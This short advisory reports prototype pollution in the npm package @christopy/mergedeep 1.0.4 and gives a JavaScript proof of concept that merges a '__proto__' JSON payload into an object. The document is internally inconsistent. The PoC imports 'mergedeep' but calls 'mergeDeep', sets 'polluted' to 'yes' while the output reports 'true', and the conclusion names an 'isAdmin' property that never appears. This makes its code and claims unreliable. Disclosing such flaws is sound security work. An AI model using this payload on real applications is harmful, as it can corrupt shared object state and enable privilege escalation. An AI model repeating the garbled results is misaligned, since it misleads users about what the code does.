# 🚨 Prototype Pollution in [christopy/mergedeep](https://www.npmjs.com/package/@christopy/mergedeep?activeTab=code) 

Version: 1.0.4


## 💥 Proof of Concept (PoC)

```js
const mergedeep = require("@christopy/mergedeep");

const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

const obj = {};

mergeDeep(obj, payload);

console.log({}.polluted); 
```

✅ Output

Before: undefined

After: true

This proves that the isAdmin property was successfully injected into the global prototype, affecting any newly created or existing object without a direct assignment.

